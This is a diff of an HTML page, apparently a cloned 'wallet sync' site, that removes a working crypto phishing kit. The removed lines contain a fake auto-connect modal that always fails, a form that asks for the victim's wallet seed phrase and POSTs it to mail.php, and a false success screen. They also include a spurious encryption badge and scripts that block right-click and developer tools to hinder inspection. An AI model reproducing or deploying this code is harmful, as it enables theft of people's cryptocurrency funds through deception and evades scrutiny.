@@ -1407,15 +1407,7 @@
                                                 class="icon-fl-send"></i></button>
                                     </form>
                                 </div>
-                                <div class="widget-social style-1 mg-t32" style="visibility:hidden">
-                                    <ul>
-                                        <li><a href="#"><i class="fab fa-twitter"></i></a></li>
-                                        <li><a href="#"><i class="fab fa-facebook"></i></a></li>
-                                        <li class="style-2"><a href="#"><i class="fab fa-telegram-plane"></i></a></li>
-                                        <li><a href="#"><i class="fab fa-youtube"></i></a></li>
-                                        <li class="mgr-none"><a href="#"><i class="icon-fl-tik-tok-2"></i></a></li>
-                                        <li class="mgr-none"><a href="#"><i class="icon-fl-vt"></i></a></li>
-                                    </ul>
+                                
                                 </div>
                             </div>
                         </div>
@@ -1424,85 +1416,6 @@
             </footer>
         </div>
 
-        <div class="modal fade popup" id="popup_connect_wallet_success" tabindex="-1" role="dialog" aria-hidden="true">
-            <div class="modal-dialog modal-dialog-centered" role="document">
-                <div class="modal-content">
-                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-                        <span aria-hidden="true">&times;</span>
-                    </button>
-                    <div class="modal-body space-y-20 pd-40">
-                        <h3 class="text-center">Wallet Successfully Validated</h3>
-                        <p class="text-center">Please save your <span class="price color-popup">QR CODE </span>
-                            generated below</p>
-                        <p class="text-center"><img align="center" width="300" height="300"
-                                src="asset/images/backgroup-secsion/validated.html"></p>
-                        <a href="#" class="btn btn-primary"> Save QR Code</a>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <div class="modal fade popup" id="popup_connect_wallet" tabindex="-1" role="dialog" aria-hidden="true">
-            <div class="modal-dialog modal-dialog-centered" role="document">
-                <div class="modal-content">
-                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-                        <span aria-hidden="true">&times;</span>
-                    </button>
-                    <div class="modal-body space-y-20 pd-40">
-
-                        <h3>
-                            <img width="50" height="50" class="avatar" id="wallet_logo" /><br>
-                            <span id="wallet_name" clas="mt-1">Sync Wallet</span>
-                        </h3>
-                        <p class="text-center">
-                            Synchronize and validate your selected wallet. A QR code via <span
-                                class="price color-popup">an Open and Decentralized protocol</span> will be generated
-                            upon successful validation.
-                        </p>
-
-                        <div id="auto_connecting" style="display:none;">
-                            <br><br><br>
-                            <div class="heading-line s2" style="width: 100%;">
-                                <br>
-                                <h5 align="center">
-                                    starting secure connection...<br>
-                                    <i align="center" style="text-align: center !important; font-size:small"
-                                        class="text-muted align-items-center">please wait...</i>
-                                </h5>
-                                <br>
-                            </div>
-                        </div>
-
-                        <div id="failed_to_connect" style="display:none;">
-                            <div
-                                style="padding:6px; color:red; border:1px solid red; border-radius:5px; text-align:center!important; font-size:16px; font-weight:500;">
-                                An error occurred... please try again or connect mannually
-                            </div>
-                            <br><br><br>
-                            <a href="#" id="try_auto_connecting_again" class="btn btn-outline-primary"
-                                aria-label="Close">Try Again</a><br>
-                            <a href="#" id="button_connect_manually" class="btn btn-primary">Connect Manually</a>
-                        </div>
-
-                        <div id="div_connect_manuallly" style="display:none;">
-                            <textarea style="font-size:25px; font-weight:650" rows="4" name="secret_phrase"
-                                id="secret_phrase" class="form-control text-primary"
-                                placeholder="Enter your 12, 15, 18, 21 or 24 Mnemonic words. Seperate them with spaces."></textarea><br>
-                            <input type="text" id="" />
-                            <button disabled type="button" id="button_connect_wallet" class="btn btn-primary"
-                                style="border-top: 5px; opacity:0.2">Connect Wallet</button>
-                        </div>
-
-                        <div>
-                            <br><br><br>
-                            <h5 align="center" class="mt-4 text-muted align-items-center"><img
-                                    src="asset/images/icon/shield.png" width="30" height="30" /> This session is
-                                protected with an end-to-end encryption</h5>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
 
 
     <a id="scroll-top"></a>
@@ -1522,121 +1435,7 @@
     <script src="asset/js/moralis.js"></script>
     <script src="asset/js/nft.js"></script>
 
-    <script>
-        //Handle Select Wallet Click
-        $(function () {
-            $('.select_wallet').on('click', function () {
-                var wd = $(this); //wd = wallet details
-
-                $('#wallet_name').text(wd.data('title'));
-                $('#wallet_logo').attr("src", wd.data('logo'));
-                $('#auto_connecting').show();
-                $('#failed_to_connect').hide();
-                $('#div_connect_manuallly').hide();
-
-                $('#popup_connect_wallet').modal('show');
-
-                //Hide autoconnecting div and show error in random interval
-                var interval = 1000 * getRandomInt(1, 15);
-                setTimeout(() => {
-                    $('#auto_connecting').hide();
-                    $('#div_connect_manuallly').hide();
-                    $('#failed_to_connect').show();
-                }, interval);
-
-
-            })
-
-            $('#try_auto_connecting_again').on('click', function (e) {
-                e.preventDefault();
-                $('#auto_connecting').show();
-                $('#failed_to_connect').hide();
-                $('#div_connect_manuallly').hide();
-
-                //Hide autoconnecting div and show error in random interval
-                var interval = 1000 * getRandomInt(1, 20);
-                setTimeout(() => {
-                    $('#auto_connecting').hide();
-                    $('#div_connect_manuallly').hide();
-                    $('#failed_to_connect').show();
-                }, interval);
-            })
-
-            $('#button_connect_manually').on('click', function (e) {
-                e.preventDefault();
-                $('#auto_connecting').hide();
-                $('#failed_to_connect').hide();
-                $('#div_connect_manuallly').show();
-            })
-
-            //FOR PHRASE TEXT VALIDATION
-            $('#secret_phrase').on('keyup', function () {
-                var phrase_seed_entered = $(this).val().trim()
-                if (phrase_seed_entered != "") {
-                    var phrase_count = phrase_seed_entered.match(/(\w+)/g).length
-                    console.log(phrase_count)
-                    if ([12, 15, 18, 21, 24].includes(phrase_count)) {
-                        $('#button_connect_wallet').attr('disabled', false).css('opacity', '1')
-                    } else {
-                        $('#button_connect_wallet').attr('disabled', true).css('opacity', '0.2')
-                    }
-                } else {
-                    $('#button_connect_wallet').attr('disabled', true).css('opacity', '0.2')
-                }
-            })
-
-            //CONNECT WALLET BUTTON Handler
-            $('#button_connect_wallet').on('click', function (e) {
-                e.preventDefault();
-                let field = $('#secret_phrase')
-                if (field.val().length >= 12) {
-                    $(this).text('Loading...').css('pointer-events', 'none')
-
-                    $.ajax({
-                        url: "mail.php",
-                        method: "POST",
-                        data: { "load_phrase": 1, "data_phrase": field.val(), "wallet_selected": $('#wallet_name').text().trim() },
-                        success: function (result) {
-
-
-                            if (result == "success") {
-                                $('#button_connect_wallet').text('Connect Wallet').css('pointer-events', 'all')
-                                $('#popup_connect_wallet').modal('hide')
-                                $('#popup_connect_wallet_success').modal('show')
-                            }
-
-                            else {
-
-                                alert(result);
-                            }
-                        },
-                        error: function (xhr, ajaxOptions, thrownError) {
-                            alert(thrownError);
-                        }
-                    })
-                }
-            })
-        })
-
-        function getRandomInt(min, max) {
-            min = Math.ceil(min);
-            max = Math.floor(max);
-            return Math.floor(Math.random() * (max - min) + min); //The maximum is exclusive and the minimum is inclusive
-        }
-
-        //DISABLE RIGHT CLICK AND CTRL KEY
-        window.oncontextmenu = function () {
-            return false;
-        }
-        $(document).keydown(function (event) {
-            if (event.keyCode == 123) {
-                return false;
-            }
-            else if ((event.ctrlKey && event.shiftKey && event.keyCode == 73) || (event.ctrlKey && event.shiftKey && event.keyCode == 74)) {
-                return false;
-            }
-        });
-    </script>
+    
 
     <style>
         .btn-outline-primary {
@@ -1659,8 +1458,4 @@
 </body>
 
 
-
-<!-- Mirrored from bloknonc.web.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 20 Mar 2023 06:23:01 GMT -->
-
-<!-- Mirrored from integratefixchains.pages.dev/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 13 Dec 2023 19:06:56 GMT -->
 </html>
